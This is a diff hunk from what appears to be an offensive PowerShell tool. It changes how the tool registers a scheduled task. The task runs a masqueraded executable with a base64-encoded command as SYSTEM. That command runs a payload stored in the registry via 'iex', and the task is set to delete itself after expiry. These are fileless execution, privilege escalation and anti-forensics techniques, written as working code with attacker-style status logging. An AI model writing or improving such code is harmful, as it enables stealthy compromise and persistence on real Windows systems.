@@ -107,18 +107,15 @@ if ($checkVal) {
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
     "iex(gp '$regPath').$regName"
 ))
-$taskCmd = "`"$masqueradeDst`" -NoP -Enc $b64"
-$taskTime = (Get-Date).AddMinutes(1).ToString('HH:mm')
-
-$createErr = (& schtasks /create /tn $taskName /ru SYSTEM /tr "$taskCmd" /sc ONCE /st $taskTime /Z 2>&1)
-Write-Log "[*] Task $taskName create output: $createErr"
-$taskCheck = schtasks /query /tn $taskName 2>&1
-if ($LASTEXITCODE -eq 0) {
+$taskAction = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
+$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+$taskSettings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter "00:00:01" -Compatibility Win8
+try {
+    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User "SYSTEM" -Force -ErrorAction Stop
     Write-Log "[+] Task $taskName created (verified)"
-} else {
-    Write-Log "[-] Task creation FAILED - $taskCheck"
+    Write-Host "[+] Task '$taskName' scheduled. Running now..."
+    Start-ScheduledTask -TaskName $taskName
+    Write-Log "[*] Task $taskName triggered"
+} catch {
+    Write-Log "[-] Task creation FAILED - $_"
 }
-
-Write-Host "[+] Task '$taskName' scheduled at $taskTime. Running now..."
-schtasks /run /tn $taskName | Out-Null
-Write-Log "[*] Task $taskName triggered"
